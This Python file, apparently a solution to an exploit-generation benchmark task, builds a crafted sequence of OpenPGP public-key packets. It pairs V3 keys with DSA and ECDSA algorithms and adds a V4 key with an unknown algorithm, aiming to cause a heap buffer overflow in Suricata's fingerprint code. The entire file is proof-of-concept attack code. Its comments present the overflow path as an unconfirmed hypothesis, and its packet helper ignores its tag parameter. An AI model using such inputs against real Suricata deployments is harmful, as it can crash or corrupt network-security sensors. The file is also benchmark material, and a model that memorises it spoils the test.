import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
        Targeting Suricata OpenPGP fingerprint writing issue where V3 keys 
        with non-RSA algorithms might trigger a buffer overflow due to 
        mismatch between allocated size (MD5/16 bytes) and written size (SHA1/20 bytes).
        """
        
        def create_mpi(data: bytes) -> bytes:
            # MPI format: 2-byte bit length (Big Endian) followed by data
            bit_len = len(data) * 8
            return struct.pack('>H', bit_len) + data

        def create_packet(tag: int, body: bytes) -> bytes:
            # OpenPGP Old Format Packet Header
            # Tag 6 (Public Key): 0x99 (10 0110 01) -> Length type 1 (2 bytes)
            # We use 0x99 for Public Key
            header = b'\x99'
            length = len(body)
            # Length type 1 is 2 bytes big endian
            return header + struct.pack('>H', length) + body

        poc = b''

        # 1. Standard valid V4 RSA Key to initialize parser state/structures
        # Version 4, Timestamp 0, Algo 1 (RSA)
        v4_body = b'\x04' + b'\x00\x00\x00\x00' + b'\x01'
        v4_body += create_mpi(b'\xCC' * 16)    # Modulus (small)
        v4_body += create_mpi(b'\x01\x00\x01') # Exponent
        poc += create_packet(6, v4_body)

        # 2. Malformed V3 Key with DSA (Algo 17)
        # Hypothesis:
        # The parser sees Version 3 and allocates 16 bytes for MD5 fingerprint.
        # It then validates the algorithm. DSA (17) is invalid for V3 (only RSA supported).
        # The error is logged, but execution proceeds.
        # The fingerprint calculation then likely falls through to a default or V4 path (SHA1).
        # It computes a 20-byte SHA1 hash and writes it into the 16-byte buffer.
        # This causes a 4-byte heap buffer overflow.
        v3_dsa_body = b'\x03' # Version 3
        v3_dsa_body += b'\x00\x00\x00\x00' # Timestamp
        v3_dsa_body += b'\x00\x00' # Validity (only in V3)
        v3_dsa_body += b'\x11' # Algo 17 (DSA)
        # DSA MPIs: p, q, g, y (dummy values)
        v3_dsa_body += create_mpi(b'\x01') 
        v3_dsa_body += create_mpi(b'\x01')
        v3_dsa_body += create_mpi(b'\x01')
        v3_dsa_body += create_mpi(b'\x01')
        poc += create_packet(6, v3_dsa_body)

        # 3. Malformed V3 Key with ECDSA (Algo 19)
        # Similar logic: V3 header (alloc 16 bytes) but ECDSA algo (writes 20 bytes SHA1 or similar)
        v3_ecdsa_body = b'\x03'
        v3_ecdsa_body += b'\x00\x00\x00\x00'
        v3_ecdsa_body += b'\x00\x00'
        v3_ecdsa_body += b'\x13' # Algo 19 (ECDSA)
        # ECDSA MPIs: OID, Point
        v3_ecdsa_body += create_mpi(b'\x06\x08\x2A\x86\x48\xCE\x3D\x03\x01\x07') # OID p-256
        v3_ecdsa_body += create_mpi(b'\x04' + b'\xAA'*32) # Point
        poc += create_packet(6, v3_ecdsa_body)

        # 4. Malformed V4 Key with Unknown Algo (250)
        # Ensure we cover cases where unknown algo might trigger default bad behavior
        v4_inv_body = b'\x04' + b'\x00\x00\x00\x00' + b'\xFA'
        v4_inv_body += create_mpi(b'\x01')
        poc += create_packet(6, v4_inv_body)

        return poc
